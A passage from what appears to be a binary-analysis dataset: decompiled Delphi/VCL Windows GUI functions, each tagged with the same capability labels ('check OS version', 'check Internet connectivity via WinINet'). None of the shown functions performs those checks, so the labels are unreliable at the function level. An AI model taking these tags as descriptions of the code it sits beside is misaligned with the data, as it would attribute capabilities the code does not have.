        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004408c0(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    code *pcStack32;\n    uint *puStack28;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x1b4) != 0) {\n        if ((*(in_EAX + 0x32c) != 0) && (var_14h = *(*(in_EAX + 0x32c) + 8),  -1 < var_14h + -1)) {\n            var_8h = 0;\n            var_4h = in_EAX;\n            if ((*(in_EAX + 0x55) & 0x20) != 0) {\n                puStack28 = 0x44091b;\n                fcn.004198b4();\n                puStack28 = 0x440922;\n                fcn.00459934();\n            }\n            pcStack32 = 0x440978;\n            uStack36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffdc;\n            puStack28 = &stack0xfffffffc;\n            piVar1 = fcn.004198b4();\n            (**(*piVar1 + 0xb0))();\n            *in_FS_OFFSET = uStack36;\n            puStack28 = 0x44097f;\n            if ((*(var_4h + 0x55) & 0x20) != 0) {\n                pcStack32 = 0x440970;\n                fcn.004198b4();\n                pcStack32 = 0x440977;\n                fcn.00459934();\n            }\n            return;\n        }\n        var_10h = *(in_EAX + 0x1b4);\n        var_ch._0_1_ = (*(in_EAX + 0x55) & 0x20) != 0;\n        puStack28 = &fcn.004408c0::var_10h;\n        pcStack32 = fcn.0044087c;\n        uStack36 = 0x4409b2;\n        uStack36 = sub.kernel32.dll_GetCurrentThreadId_1();\n        sub.user32.dll_EnumThreadWindows();\n    }\n    fcn.00454f18();\n    return;\n}\n",
        "token_count": 556
    },
    "00440b98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00440b98(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar4;\n    uint var_4h;\n    \n    *0x49350c = *0x49350c + 1;\n    if (*(in_EAX + 0x298) == 0) {\n        if (in_EAX == param_2) {\n            *(in_EAX + 0x268) = 0;\n        }\n        else {\n            *(in_EAX + 0x268) = param_2;\n        }\n    }\n    *(*0x49ac20 + 100) = param_2;\n    *(*0x49ac20 + 0x68) = in_EAX;\n    fcn.004199f8();\n    fcn.00419930();\n    cVar2 = fcn.004047dc();\n    if (cVar2 == '\\0') {\n        *(*0x49ac20 + 0x6c) = 0;\n    }\n    else {\n        *(*0x49ac20 + 0x6c) = in_EAX;\n        fcn.004199f8();\n        fcn.00419930();\n    }\n    if ((*(param_2 + 0x54) & 0x20) != 0) {\n        return 0;\n    }\n    *(param_2 + 0x54) = *(param_2 + 0x54) | *0x440e38;\n    iVar4 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (in_EAX != *(*0x49ac20 + 0x78)) {\n        if (*(*0x49ac20 + 0x78) != 0) {\n            fcn.00458594();\n            *(*0x49ac20 + 0x78) = 0;\n            cVar2 = fcn.0043ba58();\n            if (cVar2 == '\\0') {\n                fcn.00404f70();\n                return 0;\n            }\n        }\n        *(*0x49ac20 + 0x78) = in_EAX;\n        fcn.00458594();\n        cVar2 = fcn.0043ba58();\n        if (cVar2 == '\\0') {\n            fcn.00404f70();\n            return 0;\n        }\n    }\n    if (*(in_EAX + 0x26c) == 0) {\n        *(in_EAX + 0x26c) = in_EAX;\n    }\n    if (*(in_EAX + 0x26c) != param_2) {\n        while ((*(in_EAX + 0x26c) != 0 && (cVar2 = fcn.004543ec(),  cVar2 == '\\0'))) {\n            fcn.00458594();\n            *(in_EAX + 0x26c) = *(*(in_EAX + 0x26c) + 0x30);\n            cVar2 = fcn.0043ba58();\n            if (cVar2 == '\\0') {\n                fcn.00404f70();\n                return 0;\n            }\n        }\n        while (iVar4 = param_2,  *(in_EAX + 0x26c) != param_2) {\n            do {\n                iVar3 = iVar4;\n                iVar4 = *(iVar3 + 0x30);\n            } while (iVar4 != *(in_EAX + 0x26c));\n            *(in_EAX + 0x26c) = iVar3;\n            fcn.00458594();\n            cVar2 = fcn.0043ba58();\n            if (cVar2 == '\\0') {\n                fcn.00404f70();\n                return 0;\n            }\n        }\n        piVar1 = *(param_2 + 0x30);\n        if ((*(param_2 + 0x1c) & 0x10) == 0) {\n            for (; piVar1 != NULL; piVar1 = piVar1[0xc]) {\n                cVar2 = fcn.004047dc();\n                if (cVar2 != '\\0') {\n                    (**(*piVar1 + 0xdc))();\n                }\n            }\n        }\n        fcn.00451ae8(param_2);\n        if ((*(in_EAX + 0x2c4) != 0) && (*(in_EAX + 0x2c4) != param_2)) {\n            iVar4 = 0;\n            fcn.00451ae8(0);\n        }\n    }\n    *in_FS_OFFSET = iVar4;\n    *(param_2 + 0x54) = ~*0x440e38 & *(param_2 + 0x54);\n    return param_2;\n}\n",
        "token_count": 1090
    },
    "00440e40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00440e40(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if ((((*(in_EAX + 0x268) == 0) || (*(in_EAX + 0x298) != 0)) && (*(in_EAX + 0x30) != 0)) && (*(in_EAX + 0x298) == 0))\n    {\n        fcn.004589c4(0, 1);\n    }\n    uVar1 = fcn.00458594();\n    sub.user32.dll_SetFocus(uVar1);\n    iVar2 = fcn.00458594();\n    iVar3 = sub.user32.dll_GetFocus();\n    if (iVar2 == iVar3) {\n        fcn.00451ae8(0);\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "00440eb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440eb8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x276) = param_2;\n    if (*(in_EAX + 0x2c4) != 0) {\n        fcn.00451ae8(0);\n    }\n    if (param_2 != '\\0') {\n        if ((*(in_EAX + 0x268) == 0) && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n            fcn.004589c4(0, 1);\n            fcn.00440a6c();\n        }\n        fcn.00440f6c();\n        fcn.00440e40();\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00440f1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440f1c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x276) != '\\0') && (*(in_EAX + 0x268) != 0)) {\n        fcn.00451ae8(param_2);\n    }\n    if (*(in_EAX + 0x277) == '\\x02') {\n        iVar1 = fcn.0043f490();\n        if (iVar1 != 0) {\n            fcn.0043f490();\n            fcn.00440f1c();\n        }\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "00440f6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440f6c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((((*(in_EAX + 0x358) & 8) == 0) && (*(*0x49ac1c + 0x44) != 0)) && (*(*(*0x49ac1c + 0x44) + 0x290) != 0)) &&\n       ((in_EAX != *(*0x49ac1c + 0x44) && ((*(in_EAX + 0x277) == '\\x01' || (*(*(*0x49ac1c + 0x44) + 0x277) != '\\x02'))))\n       )) {\n        if (param_2 == '\\0') {\n            fcn.004388ac();\n        }\n        else {\n            fcn.00438890();\n        }\n    }\n    return;\n}\n",
        "token_count": 207
    },
    "004410fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004410fc(uint param_1, uchar *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uchar *puStack80;\n    int32_t iStack76;\n    uchar *puStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uchar *var_8h;\n    int32_t *var_4h;\n    \n    puStack44 = 0x441118;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.0042537c();\n    uStack48 = 0x4412f7;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x441137;\n    puStack44 = &stack0xfffffffc;\n    fcn.00425748();\n    uStack60 = 0x4412d4;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack68 = var_8h;\n    puStack72 = 0x44114e;\n    puStack56 = &stack0xfffffffc;\n    var_ch = sub.gdi32.dll_SaveDC();\n    iStack76 = 0x441287;\n    puStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    iVar3 = fcn.00447dd8();\n    cVar1 = fcn.004480c4();\n    if ((cVar1 != '\\0') || ((var_4h[0xa6] != 0 && (*(iVar3 + 8) != '\\0')))) {\n        (**(*var_4h + 0x44))();\n        if (*(iVar3 + 0x28) == '\\0') {\n            uVar2 = *(var_4h[0xa9] + 8) ^ 1;\n        }\n        else {\n            uVar2 = 0;\n        }\n        if (uVar2 == 0) {\n            *(var_4h[0xa9] + 8) = 0;\n        }\n        else {\n            iStack76 = var_10h - *(iVar3 + 0x18);\n            puStack80 = var_14h - *(iVar3 + 0x14);\n            puStack72 = var_8h;\n            sub.gdi32.dll_ExcludeClipRect();\n        }\n        if (var_4h[0xa6] == 0) {\n            iStack76 = 4;\n            puStack80 = 0x4411f7;\n            puStack80 = sub.gdi32.dll_GetStockObject();\n            puStack80 = fcn.004256c0(&fcn.004410fc::var_1ch);\n            sub.user32.dll_FillRect();\n        }\n        else {\n            iStack76 = 0x441228;\n            fcn.00424f64();\n            iStack76 = 0x44123b;\n            fcn.00425080();\n            iStack76 = 0x441246;\n            iStack76 = fcn.004241dc();\n            puStack80 = 0x441255;\n            puStack80 = fcn.004256c0();\n            sub.gdi32.dll_SetBkColor();\n            fcn.00425308();\n        }\n    }\n    *in_FS_OFFSET = puStack80;\n    puStack72 = 0x44128e;\n    iStack76 = var_ch;\n    puStack80 = var_8h;\n    sub.gdi32.dll_RestoreDC();\n    return;\n}\n",
        "token_count": 894
    },
    "00441628": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00441628(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) {\n        (**(*in_EAX + -0x10))();\n        return;\n    }\n    fcn.00457808();\n    return;\n}\n",
        "token_count": 86
    },
    "00441640": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441640(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (((*(param_2 + 4) == 2) && (*(in_EAX + 0x8f) == '\\x01')) && ((*(in_EAX + 7) & 0x10) == 0)) {\n        fcn.00458594();\n        iVar1 = fcn.0043b6f8();\n        if (iVar1 == 0) {\n            uVar2 = fcn.00458594(0, 0, 0, 0, 0, 7);\n            sub.user32.dll_SetWindowPos(uVar2);\n            uVar2 = fcn.00458594(0xa2, *(param_2 + 4), *(param_2 + 8));\n            sub.user32.dll_PostMessageA(uVar2);\n            if (*(in_EAX + 0x276) == '\\0') {\n                return;\n            }\n            (**(*in_EAX + 0x54))();\n            fcn.00450f6c();\n            return;\n        }\n    }\n    fcn.004524b4();\n    return;\n}\n",
        "token_count": 281
    },
    "004418b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004418b8(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x441953;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x290) != 0) {\n        iVar2 = 0;\n        if ((*(param_2 + 6) != -1) || (puVar1 = &stack0xfffffffc,  *(param_2 + 4) != 0)) {\n            puVar1 = &stack0xfffffffc;\n            if ((*(param_2 + 6) & 0x10) != 0) {\n                in_stack_ffffffd8 = *(param_2 + 8);\n                sub.user32.dll_GetSubMenu(in_stack_ffffffd8, *(param_2 + 4));\n                puVar1 = puStack24;\n            }\n            puStack24 = puVar1;\n            iVar2 = fcn.004379c0();\n            puVar1 = puStack24;\n        }\n        puStack24 = puVar1;\n        if (iVar2 == 0) {\n            fcn.00447070();\n            puVar1 = puStack24;\n        }\n        else {\n            fcn.0044d544();\n            fcn.00447070();\n            puVar1 = puStack24;\n        }\n    }\n    puStack24 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x44195a;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 439
    },
    "00441c68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00441c68(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x158) == '\\x01') && (*(in_EAX + 0x160) != 0)) {\n        uVar1 = 1;\n    }\n    else if ((*(in_EAX + 0x158) == '\\0') && (*(in_EAX + 0x15c) != 0)) {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 131
    },
    "00441cd4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00441cd4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_34h;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uint var_11h;\n    uint var_dh;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack72 = 0x441e3e;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    var_4h = param_2;\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        if (*(*(param_2 + 8) + 4) == 1) {\n            puStack68 = &stack0xfffffffc;\n            for (iVar2 = fcn.0044d290(); iVar2 != 0; iVar2 = *(iVar2 + 0x30)) {\n                cVar1 = fcn.00441c68();\n                if (cVar1 != '\\0') break;\n            }\n            if (iVar2 == 0) goto code_r0x00441e28;\n            fcn.00441ca0(&fcn.00441cd4::var_8h);\n            fcn.00418428();\n            fcn.004502c0();\n        }\n        else {\n            var_dh._0_1_ = '\\x01';\n            iVar2 = fcn.00441c28(&stack0xfffffffc);\n            if (iVar2 == 0) {\n                fcn.00441c28(&stack0xfffffffc);\n            }\n            fcn.00418428();\n            fcn.004502c0();\n        }\n        if (((*(in_EAX + 0x270) & 8) == 0) || (var_dh != '\\x01')) {\n            if (var_dh == '\\x01') {\n                fcn.00446ca8();\n            }\n            else if (var_dh == '\\0') {\n                fcn.00446c18();\n            }\n        }\n        else {\n            fcn.00446d30();\n            fcn.00446d30();\n        }\n    }\ncode_r0x00441e28:\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x441e45;\n    uStack72 = 0x441e3d;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 641
    },
    "00441eec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441eec(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_44h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    var_4h = in_EAX;\n    if ((((*(in_EAX + 0xd2) != '\\0') && ((in_EAX[0xc] == 0 || ((*(in_EAX + 7) & 0x10) == 0)))) &&\n        ((*(*(param_2 + 8) + 8) != 0 || (*(*(param_2 + 8) + 0xc) != 0)))) &&\n       ((*(*(param_2 + 8) + 0x10) == in_EAX[0x12] && (*(*(param_2 + 8) + 0x14) == in_EAX[0x13])))) {\n        fcn.0043f590();\n        fcn.00443aa0();\n        fcn.0043f590();\n        fcn.00443aa0();\n        fcn.00441ec0(arg_8h);\n        fcn.0043f590();\n        fcn.00443aa0();\n        fcn.00441ec0(arg_8h_00);\n        fcn.00441ec0(&stack0xfffffffc);\n        fcn.00441ec0(&stack0xfffffffc);\n    }\n    fcn.00456990();\n    iVar2 = fcn.00447dd8();\n    cVar1 = fcn.004480c4();\n    if (((cVar1 != '\\0') && (*(iVar2 + 0x28) == '\\0')) && (*(var_4h + 0x57) != '\\0')) {\n        iVar3 = *(param_2 + 8);\n        if ((*(iVar3 + 0x10) != 0) || (*(iVar3 + 0x14) != 0)) {\n            iVar5 = *(iVar3 + 0x10) - var_4h[0x12];\n            iVar3 = *(iVar3 + 0x14) - var_4h[0x13];\n            if ((iVar5 != 0) || (iVar3 != 0)) {\n                (**(*var_4h + 0x44))();\n                fcn.00418464(&var_24h, var_8h - *(iVar2 + 0x18));\n                if ((*(iVar2 + 0x10) < var_18h) || (iVar3 < 1)) {\n                    if (0 < iVar3) {\n                        var_18h = var_18h + iVar3;\n                    }\n                    if (var_18h < var_20h) {\n                        var_18h = var_20h;\n                    }\n                }\n                else {\n                    var_18h = var_20h - iVar3;\n                    var_20h = *(iVar2 + 0x18);\n                    *(var_4h[0xa9] + 8) = 1;\n                }\n                iVar2 = *(iVar2 + 0xc);\n                if ((var_1ch < iVar2) && (0 < iVar5)) {\n                    var_24h = var_1ch - iVar5;\n                    *(var_4h[0xa9] + 8) = 1;\n                    var_1ch = iVar2;\n                }\n                else {\n                    if (0 < iVar5) {\n                        var_1ch = var_1ch + iVar5;\n                    }\n                    if (var_1ch < var_24h) {\n                        var_1ch = var_24h;\n                    }\n                }\n                uVar4 = fcn.00458594(&var_24h, 0);\n                sub.user32.dll_InvalidateRect(uVar4);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1010
    },
    "0044221c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044221c(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *in_FS_OFFSET;\n    uint32_t uStack60;\n    int32_t iStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack52 = &stack0xfffffffc;\n    uStack32 = 0x442878;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar1 = &stack0xfffffffc;\n    if (((*(in_EAX + 7) & 0x10) == 0) && (puVar1 = &stack0xfffffffc,  (*(in_EAX + 0xd6) & 4) != 0)) {\n        puStack40 = 0x44225d;\n        fcn.00407550();\n        puStack40 = 0x44226c;\n        fcn.0040db04();\n        puStack40 = 0x442271;\n        fcn.00404ec4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    puStack40 = 0x44227b;\n    fcn.00447160();\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) | 4;\n    uStack44 = 0x44285b;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        if (*(in_EAX + 0x1da) == '\\0') {\n            iStack56 = 0x44272d;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack40 = &stack0xfffffffc;\n            fcn.0040484c();\n            *in_FS_OFFSET = uStack60;\n            if (*(*0x49ac20 + 0x6c) == in_EAX) {\n                puStack52 = 0x44275b;\n                fcn.00440f6c();\n            }\n            if (*(in_EAX + 0x277) == '\\x01') {\n                puStack52 = 0x442772;\n                (**(*in_EAX + 0xb0))();\n            }\n            else if ((*(in_EAX + 0xd6) & 8) == 0) {\n                iVar7 = 0;\n                puStack52 = 0x4427af;\n                iVar3 = fcn.00458594();\n                puStack52 = 0x4427b6;\n                iVar6 = sub.user32.dll_GetActiveWindow();\n                if (iVar3 == iVar6) {\n                    puStack52 = 0x4427c2;\n                    fcn.00458594();\n                    puStack52 = 0x4427c7;\n                    iVar3 = fcn.0043b6f8();\n                    if (iVar3 == 0) {\n                        puStack52 = 0x4427d3;\n                        fcn.00458594();\n                        puStack52 = 0x4427d8;\n                        iVar7 = fcn.0043ba1c();\n                    }\n                }\n                if (iVar7 == 0) {\n                    puStack52 = NULL;\n                    iStack56 = 0x44280d;\n                    iStack56 = fcn.00458594();\n                    uStack60 = 0x442813;\n                    sub.user32.dll_ShowWindow();\n                }\n                else {\n                    puStack52 = 0x97;\n                    iStack56 = 0;\n                    uStack60 = 0;\n                    uVar5 = fcn.00458594(0, 0, 0);\n                    sub.user32.dll_SetWindowPos(uVar5);\n                    sub.user32.dll_SetActiveWindow(iVar7);\n                }\n            }\n            else {\n                puStack52 = 0x97;\n                iStack56 = 0;\n                uStack60 = 0;\n                uVar5 = fcn.00458594(0, 0, 0);\n                sub.user32.dll_SetWindowPos(uVar5);\n            }\n        }\n        else {\n            iStack56 = 0x4422d4;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack52 = &stack0xfffffffc;\n            puStack40 = &stack0xfffffffc;\n            fcn.0040484c();\n            *in_FS_OFFSET = uStack60;\n            if ((*(in_EAX + 0x9e) == '\\x04') || ((*(in_EAX + 0x9e) == '\\x06' && (*(in_EAX + 0x277) == '\\x01')))) {\n                if (*(in_EAX + 0x277) == '\\x01') {\n                    puStack52 = 0x442330;\n                    iVar3 = fcn.004501ac();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x44234c;\n                    iVar3 = fcn.004501f0();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x442367;\n                    iVar3 = fcn.00443d20();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x442380;\n                    iVar3 = fcn.00443d14();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                puStack52 = 0x442399;\n                iVar3 = fcn.00443d38();\n                if (iVar6 < iVar3) {\n                    puStack52 = 0x4423a7;\n                    fcn.00443d38();\n                }\n                puStack52 = 0x4423b3;\n                iVar3 = fcn.00443d2c();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x4423c1;\n                    fcn.00443d2c();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x4423e0;\n                (**(*in_EAX + 0x88))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    puStack52 = 0x4423f5;\n                    fcn.0043fd90();\n                }\n            }\n            else if (*(in_EAX + 0x9e) - 6U < 2) {\n                iVar3 = *(*0x49ac1c + 0x44);\n                if (*(in_EAX + 0x9e) == '\\a') {\n                    puStack52 = 0x442437;\n                    cVar2 = fcn.004047dc();\n                    if (cVar2 != '\\0') {\n                        iVar3 = in_EAX[1];\n                    }\n                }\n                if (iVar3 == 0) {\n                    puStack52 = 0x442487;\n                    iVar3 = fcn.00443d20();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x4424a0;\n                    iVar3 = fcn.00443d14();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x44244c;\n                    iVar6 = fcn.0043df38();\n                    uVar4 = *(iVar3 + 0x48) - in_EAX[0x12];\n                    iVar7 = uVar4 >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((uVar4 & 1) != 0);\n                    }\n                    iVar6 = iVar6 + iVar7;\n                    puStack52 = 0x442467;\n                    iVar7 = fcn.0043df58();\n                    uVar4 = *(iVar3 + 0x4c) - in_EAX[0x13];\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    iVar7 = iVar7 + iVar3;\n                }\n                puStack52 = 0x4424b9;\n                iVar3 = fcn.00443d38();\n                if (iVar6 < iVar3) {\n                    puStack52 = 0x4424c7;\n                    fcn.00443d38();\n                }\n                puStack52 = 0x4424d3;\n                iVar3 = fcn.00443d2c();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x4424e1;\n                    fcn.00443d2c();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x442500;\n                (**(*in_EAX + 0x88))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    puStack52 = 0x442515;\n                    fcn.0043fd90();\n                }\n            }\n            else if (*(in_EAX + 0x9e) == '\\x05') {\n                if (*(in_EAX + 0x277) == '\\x01') {\n                    puStack52 = 0x44253b;\n                    iVar3 = fcn.004501ac();\n                    iVar7 = iVar3 - in_EAX[0x12] >> 1;\n                    